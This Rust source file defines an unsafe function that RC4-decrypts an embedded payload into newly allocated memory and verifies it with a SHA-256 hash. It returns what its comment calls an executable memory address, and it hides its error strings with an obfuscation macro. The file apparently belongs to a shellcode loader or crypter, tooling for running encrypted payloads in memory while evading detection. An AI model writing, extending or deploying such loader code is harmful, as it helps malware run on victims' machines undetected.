use crate::alloc_mem::alloc_mem;

pub unsafe fn decrypt(decoded: &[u8]) -> Result<(usize, usize), String> {
    use rustcrypt_ct_macros::obf_lit;
    use rc4::{Rc4, StreamCipher, KeyInit};
    use generic_array::{GenericArray, typenum::U32};
    use sha2::{Sha256, Digest};
    let key_len = 32;
    let hash_len = 32;
    if decoded.len() < key_len + hash_len + 1 {
        return Err(obf_lit!("rc4 payload too short").to_string());
    }
    let key = &decoded[0..key_len];
    let hash = &decoded[key_len..key_len + hash_len];
    let encrypted = &decoded[key_len + hash_len..];
    let p = unsafe { alloc_mem(encrypted.len())? };
    std::ptr::copy_nonoverlapping(encrypted.as_ptr(), p, encrypted.len());
    let buf = std::slice::from_raw_parts_mut(p, encrypted.len());
    let key_array: &GenericArray<u8, U32> = GenericArray::from_slice(key);
    let mut cipher = Rc4::new(key_array);
    cipher.apply_keystream(buf);
    let mut hasher = Sha256::new();
    hasher.update(buf);
    let calc_hash = hasher.finalize();
    if hash != calc_hash.as_slice() {
        return Err(obf_lit!("rc4 hash mismatch").to_string());
    }
    Ok((p as usize, encrypted.len())) // Return executable memory address
}